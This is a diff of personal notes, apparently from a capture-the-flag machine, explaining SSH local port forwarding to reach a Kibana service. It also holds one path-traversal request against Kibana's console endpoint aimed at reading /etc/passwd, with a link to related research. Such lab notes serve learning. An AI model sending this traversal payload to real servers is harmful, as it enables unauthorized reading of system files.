@@ -1,4 +1,18 @@
+#localhost:5601 opens kibana
 ssh -L 5601:localhost:5601: security@10.10.10.115
 
+#localhost:1234 opens kibana
+ssh -L 1234:localhost:5601: security@10.10.10.115
+
+ssh -L A:B:C:D@E
+A:  my local port
+B:  an ip accessed by the remote host of creds given as D@E
+C:  port accessed by B
+D:  user
+E:  remote ip target
+so.... on my localhost:A access B:C as if I were D@E
+
+# this times out...
+/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../etc/passwd
 #tunneling... local listens... i had to use the same port
 #https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/
